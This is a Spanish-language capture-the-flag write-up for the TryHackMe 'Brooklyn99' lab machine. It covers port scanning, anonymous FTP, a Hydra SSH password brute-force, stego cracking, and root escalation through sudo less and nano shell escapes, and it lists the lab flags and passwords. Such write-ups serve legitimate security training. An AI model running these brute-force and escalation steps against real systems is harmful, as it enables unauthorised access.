# Brooklyn99

###### tags: `Try Hack Me` `Linux` `FTP` `Stego` `Sudo` `Less` `Nano` `Hydra`
________________________

### **FLAGS:** 
    - User Flag: ee11cbb19052e40b07aac0ca060c23ee
    - Root Flag: 63a9f0ea7bb98050796b649e85481845
________________________

### **USERS:**
    - Jake (pwd: 987654321)
    - Amy
    - Holt (pwd: fluffydog12@ninenine)

________________________

### **ENUMERACIÓN**

1. Vemos si el host esta levantado y saber el SSOO (**Linux**: TTL <= 64)
<code>ping -c1 IP</code>

    ![](https://i.imgur.com/ChPq5yn.png)

2. Escaneamos los puertos abiertos

    - Primero vemos si va muy lento el escaneo:
    <code>nmap -p- --open -T5 -v -n IP</code>
    
            -p-		Todos los puertos
            --open 	Mostrar solos puertos abiertos
            -T5		Modo más agresivo
            -v 		Modo verbose (reporta por pantalla)
            -n		No aplicar resolución DNS
        
    - Como va lento, lanzamos este otro comando:
    <code>nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP</code>
    
            -sS		Realizar un TCP SYN port scan
            --min-rate	Emitir al menos 5000 paquetes por segundo
            -Pn		No realizar Host Discovery

     - Va más rápido y encuentra los puertos 21 (FTP), 22 (SSH) y 80 (HTTP)

        ![](https://i.imgur.com/w8Zg1RX.png)

3. Obtenemos los servicios que corren en los puertos
<code>nmap -sC -sV -p21,22,80 IP</code>

    ![](https://i.imgur.com/mYNr6IC.png)

4. Vemos que tiene acceso anónimo por FTP. Probamos a conectar:

    ![](https://i.imgur.com/5yTRtI7.png)

    - Vemos un fichero txt, lo descargamos con <code>get FILE</code> y lo vemos en local. 

    - Son los nombres de B99, pero bueno, pueden ser usuarios, sobretodo jake, y sabemos que tiene una password mala, posiblemente crackeable.

        <mark>Tenemos 3 posibles usuarios: **jake, amy y holt**</mark>

    - Luego probaremos con hydra a acceder por SSH con el usuario Jake.

5. Nos centramos ahora en el servidor web Apache. Lanzamos un whatweb para ver si usa algún CMS tipo Wordpress, pero vemos que no, es un Apache normal

    ![](https://i.imgur.com/0dZuyrW.png)

6. Accedemos al portal web y vemos lo mismo con Wappalyzer. El portal no nos dice nada. Vemos el código fuente de la página a ver si encontramos algo. Vemos una pista xdd:

    ![](https://i.imgur.com/pJgKFK6.png)
    
    - Descargamos la imagen y la pasamos por exiftool, strings y binwalk. Es troll, no hay nada.

7. Vamos a hacer un fuzzing en el portal para encontrar alguna ruta con GoBuster. Nada destacable.

    <code>gobuster dir -u IP -w DICT -q -n -e</code>

            -u    	Target 
            -w     	Diccionario (/usr/share/wordlists/dirb/common.txt)
            -q		Silencioso, no muestra mensajes de estado           
            -n		No muestra códigos de estado        
            -e		Muestra URLs completas
        
        ![](https://i.imgur.com/YyxEFsh.png)

8. Intentamos crackear la password de SSH con Hydra:

    <code>hydra -l jake -P DICT ssh://IP -t 16</code>

         -l            Usuario
         -P            Diccionario de passwords (/usr/share/wordlists/rockyou.txt)
         ssh://IP      Servidor al que atacar
         -t            Número de hilos

    - Bingo, tenemos la password de jake

        <mark>Tenemos la password de Jake: **987654321**</mark>
        
        ![](https://i.imgur.com/8QNyhWR.png)

______________

### **GET A SHELL** 

Nos conectamos por SSH con las credenciales de Jake

____________________

### **USER FLAG**

Navegamos un poco por la máquina y vemos 3 usuarios en el directorio /home (jake, amy y holt). Buscamos la flag user.txt en sus directorios. Está en el de holt. Podemos verla
    
![](https://i.imgur.com/qxxoojx.png)
    
<mark>Tenemos la user flag: **ee11cbb19052e40b07aac0ca060c23ee**</mark>
_____________________

### **ROOT FLAG**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4). También podemos lanzar este [script](https://github.com/rebootuser/LinEnum) para enumerar el sistema.

1. En primer lugar, intentamos ver los privilegios de sudo del usuario jake. Ejecutamos <code>sudo -l</code>.

    ![](https://i.imgur.com/NGWT03F.png)
    
    - Vemos que puede ejecutar como sudo el comando less sin passwd.

2. Seguimos esta [guía](https://gtfobins.github.io/gtfobins/less/) para escalar privilegios:

    ![](https://i.imgur.com/MWL6iIQ.png)

    - Ejecutamos:
        
        <code>sudo less /etc/profile</code>

        <code>!/bin/sh</code>

        ![](https://i.imgur.com/0OIOC82.png)

3. Hemos escalado privilegios. Vamos al directorio /root a por la 2a Flag.

    <mark>Tenemos la root flag: **63a9f0ea7bb98050796b649e85481845**</mark>
_____________________

### **OTRO MÉTODO**

La info nos dice que hay 2 opciones de rootear la máquina. 

Probamos de nuevo la stego. Vamos a intentar crackear el fichero a ver si hay algo oculto con password. Usamos <code>stegcracker IMAGE</code>

![](https://i.imgur.com/A64h4OP.png)

Vemos que nos da la password de Holt:

<mark>Tenemos la password de Holt: **fluffydog12@ninenine**</mark>
    
Nos logeamos por SSH con estas credenciales. Vemos de nuevo la user.txt y un fichero para el cual no tenemos permiso. Lo dejamos para luego:

![](https://i.imgur.com/7TraZ29.png)

De nuevo con <code>sudo -l</code> vemos un punto de acceso. 

![](https://i.imgur.com/xnoObGM.png)

Se puede ejecutar /bin/nano sin password como sudo. Seguimos esta [guía](https://gtfobins.github.io/gtfobins/nano/) para escalar privilegios:

![](https://i.imgur.com/9pGrmpJ.png)

![](https://i.imgur.com/hnoD19L.png)

- Otras opciones sin levantar una shell:

    - jake:
        ![](https://i.imgur.com/rykMtJK.png)
    - holt:
        ![](https://i.imgur.com/tW1hHdx.png)

- Además, como Jake, podemos ver el fichero nano.save, donde vemos que esta el exploit del reset usado:
    
    ![](https://i.imgur.com/ihvoZ9Q.png)
